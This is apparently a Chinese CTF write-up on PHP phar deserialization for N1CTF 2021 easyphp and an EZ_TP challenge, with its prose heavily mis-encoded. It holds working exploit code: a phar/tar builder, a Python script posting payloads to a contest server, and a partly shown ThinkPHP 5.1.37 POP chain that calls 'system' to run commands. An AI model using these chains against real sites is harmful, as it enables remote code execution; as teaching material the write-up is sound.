easyphpä¸ºä¾‹å­ï¼Œè¿™é¢˜å…è®¸æˆ‘ä»¬å†™å…¥æ—¥å¿—ï¼Œå¹¶ä¸”å¯ä»¥åˆ©ç”¨pharååºåˆ—åŒ–å¾—åˆ°flagï¼Œéš¾ç‚¹åœ¨äºæ—¥å¿—æ–‡ä»¶å‰åæœ‰é¢å¤–è„æ•°æ®ï¼Œä¼šä½¿å¾—æˆ‘ä»¬çš„pharæ–‡ä»¶æ— æ³•è¢«è§£æã€‚</p>\n<p>ç„¶è€Œå¦‚æœä»¥taræ ¼å¼å‚¨å­˜pharï¼Œæœ«å°¾çš„è„æ•°æ®å¹¶ä¸ä¼šå½±å“è§£æï¼ˆè¿™æ˜¯tarçš„æ ¼å¼å†³å®šçš„ï¼‰ï¼Œè€Œå¼€å¤´çš„è„æ•°æ®å¯ä»¥åœ¨åˆ¶é€ pharæ–‡ä»¶æ—¶å°±æå‰æ„é€ å¥½ï¼ˆè¿™æ ·è¿™éƒ¨åˆ†æ•°æ®ä¹Ÿä¼šè¢«çº³å…¥ç­¾åè®¡ç®—ï¼‰ï¼Œå†™å…¥æ—¥å¿—æ—¶ä¸å¿…å†™å…¥è¿™éƒ¨åˆ†ï¼Œè€Œæ˜¯ä»¤å…¶ä¸è„æ•°æ®æ‹¼æ¥å½¢æˆåˆæ³•çš„pharã€‚exploitå¦‚ä¸‹ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">  CLASS FLAG &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;FLAG: &quot;</span> . <span class=\"variable language_\">$this</span>-&gt;_flag;</span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$sb</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;sb&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$ts</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;ts&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$phar</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"variable\">$sb</span>.<span class=\"string\">&quot;.phar&quot;</span>); <span class=\"comment\">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class=\"line\">    **<span class=\"variable\">$phar</span> = <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">convertToExecutable</span>(<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">TAR</span>); <span class=\"comment\">//ä¼šç”Ÿæˆ*.phar.tar**</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();</span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;Time: &quot;</span>.<span class=\"variable\">$ts</span>.<span class=\"string\">&quot; IP: [], REQUEST: [log_type=&quot;</span>.<span class=\"variable\">$sb</span>.<span class=\"string\">&quot;], CONTENT: [&quot;</span>, <span class=\"string\">&quot;&quot;</span>); <span class=\"comment\">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class=\"line\">    <span class=\"comment\">//taræ–‡ä»¶å¼€å¤´æ˜¯ç¬¬ä¸€ä¸ªæ·»åŠ æ–‡ä»¶çš„çš„æ–‡ä»¶åï¼Œæ³¨æ„æ·»åŠ çš„æ–‡ä»¶é¡ºåºä¸è¦é”™äº†</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class=\"comment\">//è®¾ç½®stub</span></span><br><span class=\"line\">    <span class=\"variable\">$o</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">FLAG</span>();</span><br><span class=\"line\">  <span class=\"variable\">$o</span> -&gt; data = <span class=\"string\">&#x27;g0dsp3ed_1s_g0D&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$o</span>); <span class=\"comment\">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class=\"line\">    <span class=\"comment\">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>æŠŠè¿™ä¸ªè·‘åœ¨æœ¬åœ°webæœåŠ¡ä¸Šï¼Œç„¶åå†™ä¸ªè„šæœ¬ï¼ˆå½“æ—¶åŠå¤œèµ¶åˆ¶çš„å¾ˆä¸‘ä¼šç•™ä¸‹ä¸€äº›åƒåœ¾æ–‡ä»¶ æ±‚è½»å–· é˜Ÿé‡Œå¸ˆå‚…å†™çš„å¹²å‡€å¤šäº†ï¼‰ï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests <span class=\"keyword\">as</span> rq</span><br><span class=\"line\"><span class=\"keyword\">import</span> json </span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\">ip = <span class=\"string\">&#x27;&lt;here_is_remote_ip&gt;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">generate_random_str</span>(<span class=\"params\">randomlength=<span class=\"number\">16</span></span>):</span><br><span class=\"line\">  <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">  ç”Ÿæˆä¸€ä¸ªæŒ‡å®šé•¿åº¦çš„éšæœºå­—ç¬¦ä¸²</span></span><br><span class=\"line\"><span class=\"string\">  &quot;&quot;&quot;</span></span><br><span class=\"line\">  random_str = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">  base_str = <span class=\"string\">&#x27;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class=\"line\">  length = <span class=\"built_in\">len</span>(base_str) - <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(randomlength):</span><br><span class=\"line\">    random_str += base_str[random.randint(<span class=\"number\">0</span>, length)]</span><br><span class=\"line\">  <span class=\"keyword\">return</span> random_str</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">new_one</span>(<span class=\"params\">offset</span>):</span><br><span class=\"line\">    rd = generate_random_str(<span class=\"number\">4</span>)</span><br><span class=\"line\">    ts2 = time.strftime(<span class=\"string\">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,time.localtime(time.time()+offset))</span><br><span class=\"line\">    ts = time.strftime(<span class=\"string\">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,time.localtime(time.time()))</span><br><span class=\"line\">    res = rq.get(url=<span class=\"string\">f&quot;http://127.0.0.1/test.php?sb=<span class=\"subst\">&#123;rd&#125;</span>&amp;ts=<span class=\"subst\">&#123;ts2&#125;</span>&quot;</span>)  <span class=\"comment\"># è®¿é—®æœ¬åœ°ç”Ÿæˆphar</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">f&#x27;<span class=\"subst\">&#123;rd&#125;</span>.phar.tar&#x27;</span>,<span class=\"string\">&quot;rb&quot;</span>) <span class=\"keyword\">as</span> f: </span><br><span class=\"line\">        data = f.read()</span><br><span class=\"line\">    data = data[<span class=\"number\">70</span>::]<span class=\"comment\">#å»æ‰å‰é¢çš„å†—ä½™éƒ¨åˆ†ä»¥ä¾¿å’Œlogå‰é¢æ‹¼æ¥å½¢æˆåˆæ³•*.phar.tar</span></span><br><span class=\"line\">    headers = &#123;<span class=\"string\">&#x27;content-type&#x27;</span>: <span class=\"string\">&#x27;application/x-www-form&#x27;</span>&#125;  <span class=\"comment\"># æºæ–‡æœ¬</span></span><br><span class=\"line\">    res = rq.post(url=<span class=\"string\">f&quot;http://43.155.59.185:53340/log.php?log_type=<span class=\"subst\">&#123;rd&#125;</span>&quot;</span>,data=data)  <span class=\"comment\"># å†™å…¥æ—¥å¿—</span></span><br><span class=\"line\">    res = rq.post(url=<span class=\"string\">f&quot;http://43.155.59.185:53340?file=phar://./log/<span class=\"subst\">&#123;ip&#125;</span>/<span class=\"subst\">&#123;rd&#125;</span>_www.log&quot;</span>)  <span class=\"comment\"># ååºåˆ—åŒ–</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(res.text)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(-<span class=\"number\">30</span>,<span class=\"number\">30</span>):<span class=\"comment\">#è€ƒè™‘æœ¬åœ°å’Œè¿œç¨‹çš„æ—¶é—´å·®å¼‚ï¼Œè¿™è¾¹è®¾ç½®ä¸ª30sçš„çª—å£æœŸ</span></span><br><span class=\"line\">    new_one(i)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">0.9</span>)</span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;ç”Ÿæˆçš„æ–‡ä»¶é•¿è¿™æ ·ï¼ˆçœ‹ä¸ªå¼€å¤´å°±è¡Œï¼‰</span></span><br><span class=\"line\"><span class=\"string\">00000000: 5469 6d65 3a20 3230 3231 2d31 312d 3232  Time: 2021-11-22</span></span><br><span class=\"line\"><span class=\"string\">00000010: 2030 363a 3533 3a31 3520 4950 3a20 5b5d   06:53:15 IP: []</span></span><br><span class=\"line\"><span class=\"string\">00000020: 2c20 5245 5155 4553 543a 205b 5d2c 2043  , REQUEST: [], C</span></span><br><span class=\"line\"><span class=\"string\">00000030: 4f4e 5445 4e54 3a20 5b5f 5f5f 5f5f 5f5f  ONTENT: [_______</span></span><br><span class=\"line\"><span class=\"string\">00000040: 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  ________________</span></span><br><span class=\"line\"><span class=\"string\">00000050: 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  ________________</span></span><br><span class=\"line\"><span class=\"string\">00000060: 5f5f 5f5f 3030 3030 3634 3400 0000 0000  ____0000644.....</span></span><br><span class=\"line\"><span class=\"string\">00000070: 0000 0000 0000 0000 0000 0000 3030 3030  ............0000</span></span><br><span class=\"line\"><span class=\"string\">00000080: 3030 3030 3032 3400 3134 3134 3636 3337  0000024.14146637</span></span><br><span class=\"line\"><span class=\"string\">00000090: 3133 3300 3030 3233 3534 3320 3000 0000  133.0023543 0...</span></span><br><span class=\"line\"><span class=\"string\">000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>ä¸åªæ˜¯tarï¼Œè¿˜æœ‰åˆ«çš„æ ¼å¼ï¼š</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/targz.png\" loading=\"lazy\"><br><a href=\"https://www.php.net/manual/zh/phar.converttoexecutable.php\">https://www.php.net/manual/zh/phar.converttoexecutable.php</a></p>\n<p>å¯¹åº”çš„ä»£ç ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">convertToExecutable</span>(<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">TAR</span>,<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">BZ2</span>);<span class=\"comment\">//ä¼šç”Ÿæˆxxxx.phar.tar.bz2</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">convertToExecutable</span>(<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">TAR</span>,<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">GZ</span>);<span class=\"comment\">//ä¼šç”Ÿæˆxxxx.phar.tar.gz</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">convertToExecutable</span>(<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">ZIP</span>);<span class=\"comment\">//ä¼šç”Ÿæˆxxxx.phar.zip</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h3 id=\"POPé“¾\"><a href=\"#POPé“¾\" class=\"headerlink\" title=\"POPé“¾\"></a><strong>POPé“¾</strong></h3><p>POP(property oriented programming)ï¼Œè¯´ç™½äº†å°±æ˜¯ç»è¿‡ä¸€è¿ä¸²çš„é­”æœ¯æ–¹æ³•&#x2F;ç‰¹æ®Šæ–¹æ³•è°ƒç”¨è¾¾åˆ°ç‰¹å®šç›®çš„çš„ä¸€ç§æ”»å‡»æ–¹å¼ï¼Œæœ¬è´¨æ˜¯é€šè¿‡åœ¨è°ƒç”¨è¿™äº›æ–¹æ³•çš„è¿‡ç¨‹ä¸­åˆè§¦å‘äº†åˆ«çš„ç‰¹æ®Šæ–¹æ³•ï¼Œå¼•å‘è¿é”ååº”ç›´åˆ°è§¦åŠç›®æ ‡ã€‚pharååºåˆ—åŒ–ä½¿å¾—ä¸å­˜åœ¨unserilizeå‡½æ•°æ—¶è¿™æ ·çš„æ”»å‡»ä¹Ÿèƒ½æˆåŠŸï¼Œè¿™æ­£æ˜¯æ‰€è°“â€œæ‰©å¤§æ”»å‡»é¢â€ã€‚æˆ‘ä»¬ä»¥åˆšåˆšç»“æŸçš„å®‰æ´µæ¯2021 EZ_TPä¸ºä¾‹å­ã€‚</p>\n<p>ç½‘ç«™ä½¿ç”¨ThinkPHP V5.1.37ï¼Œç½‘ä¸Šå·²æœ‰ç°æˆçš„<a href=\"https://blog.csdn.net/lllffg/article/details/116145918\">POPé“¾</a>ï¼Œç°åœ¨éœ€è¦æˆ‘ä»¬åœ¨æ²¡æœ‰unserilizeå‡½æ•°çš„æƒ…å†µä¸‹å®Œæˆååºåˆ—åŒ–æ”»å‡»ã€‚</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">app</span>\\<span class=\"title class_\">index</span>\\<span class=\"title class_\">controller</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">think</span>\\<span class=\"title\">Controller</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Index</span> <span class=\"keyword\">extends</span> <span class=\"title\">controller</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">index</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12è½½åˆå¿ƒä¸æ”¹ï¼ˆ2006-2018ï¼‰ - ä½ å€¼å¾—ä¿¡èµ–çš„PHPæ¡†æ¶&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hello</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">        <span class=\"variable\">$hello</span> = <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"string\">&#x27;Welcome to D0g3&#x27;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;hello&#x27;</span>])||<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;hello&#x27;</span>])) <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;world&#x27;</span>]))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">parse_str</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;world&#x27;</span>],<span class=\"variable\">$haha</span>);</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">extract</span>(<span class=\"variable\">$haha</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$a</span> = <span class=\"string\">&#x27;hello.txt&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$s</span> = <span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$hello</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"string\">&#x27;hello.txt&#x27;</span>, <span class=\"variable\">$s</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> (<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>parse_str()å’Œextract()ä½¿å¾—æˆ‘ä»¬å¯ä»¥é€šè¿‡å˜é‡è¦†ç›–å®Œæˆæ–‡ä»¶å†™å…¥ä¸ä»»æ„è¯»å–ï¼Œå¹¶ä¸”$aå¯ä»¥ä½¿ç”¨ä¼ªåè®®ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥çš„äº‹æƒ…å°±ç†æ‰€åº”å½“äº†ï¼šå¾€hello.txté‡Œå†™å…¥ä¸€ä¸ªpharï¼Œmetadataé‡Œé¢æ”¾ThinkPHP 5.1.37 çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œå®ŒæˆRCE.(å…³äºè¿™ä¸ªPOPé“¾çš„åŸç†è¯·å‚é˜…<a href=\"https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.1.37-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html\">https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-ååºåˆ—åŒ–æ¼æ´/Thinkphp-5.1.37-ååºåˆ—åŒ–æ¼æ´.html</a> è®²çš„å¾ˆè¯¦ç»†)</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">think</span>&#123;</span><br><span class=\"line\">    <span class=\"title class_\">abstract</span> <span class=\"title class_\">class</span> <span class=\"title class_\">Model</span>&#123;</span><br><span class=\"line\">        <span class=\"title class_\">protected</span> $<span class=\"title class_\">append</span> = [];</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$data</span> = [];</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;append = [<span class=\"string\">&quot;ethan&quot;</span>=&gt;[<span class=\"string\">&quot;godspeedyyds&quot;</span>,<span class=\"string\">&quot;xtxyyds&quot;</span>]];</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;data = [<span class=\"string\">&quot;ethan&quot;</span>=&gt;<span class=\"keyword\">new</span> <span class=\"title class_\">Request</span>()];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Request</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$hook</span> = [];</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$filter</span> = <span class=\"string\">&quot;system&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$config</span> = [</span><br><span class=\"line\">            <span class=\"string\">&#x27;var_method&#x27;</span>       =&gt; <span class=\"string\">&#x27;_method&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;var_ajax&#x27;</span>         =&gt; <span class=\"string\">&#x27;_ajax&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;var_pjax&#x27;</span>         =&gt; <span class=\"string\">&#x27;_pjax&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class=\"string\">&#x27;s&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [</span><br><span class=\"line\">                <span class=\"string\">&#x27;ORIG_PATH_INFO&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;REDIRECT_PATH_INFO&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;REDIRECT_URL&#x27;</span></span><br><span class=\"line\">            ],</span><br><span class=\"line\">            <span class=\"string\">&#x27;default_filter&#x27;</span>   =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;url_domain_root&#x27;</span>  =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;https_agent_name&#x27;</span> =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class=\"string\">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class=\"string\">&#x27;html&#x27;</span>,</span><br><span class=\"line\">        ];</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"variable\">$param</span> = [<span class=\"string\">&#x27;cat /y0u_f0und_It&#x27;</span>];</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;filter = <span 